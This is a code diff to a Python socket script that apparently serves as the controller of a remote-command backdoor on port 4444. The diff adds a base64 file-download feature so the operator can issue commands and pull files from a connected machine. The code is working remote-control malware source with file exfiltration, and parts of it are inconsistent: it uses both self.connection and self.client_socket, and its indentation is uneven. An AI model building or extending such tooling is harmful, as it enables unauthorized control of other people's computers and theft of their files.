@@ -1,4 +1,4 @@
-import socket, json # connect to server
+import socket, json, base64 # connect to server
 
 server_host = "localhost" # 192.168.0.81
 server_port = 4444
@@ -20,13 +20,13 @@ class Connection:
         self.client_socket.send(json_data)
     
     def json_recieve(self):
-            json_data = ""
-            while True:
-                try:
-                    json_data = json_data + self.client_socket.recv(1024).decode()
-                    return json.loads(json_data)
-                except ValueError:
-                    continue
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.client_socket.recv(1024).decode()
+                return json.loads(json_data)
+            except ValueError:
+                continue
     
     def execute_command(self, command):
         if command.lower() == "exit":
@@ -37,12 +37,34 @@ class Connection:
     def quit(self):
             print("closed connection")
             self.connection.close()
-            
+
+    def read_file(self, path):
+        try:
+            with open(path, "rb") as file:
+                return base64.b64encode(file.read())
+        except Exception as e:
+            print(f"{str(e)}")
+
+    
+    def write_file(self, path, content): 
+         with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[Download Sucessful]"
+              
     def run(self):
         while True:
-            command = input("Enter a command: ")
-            result = self.execute_command(command)
-            print(result)
+            try:
+                command = input("Enter a command: ")
+                command_word = command.split()
+                
+                result = self.execute_command(command)
+
+                if command_word[0] == "download":
+                    result = self.write_file(command_word[1], result)
+
+                print(result)
+            except Exception as e:
+                print(f"{str(e)}")
 
 connection = Connection(server_host,server_port)
 connection.run()
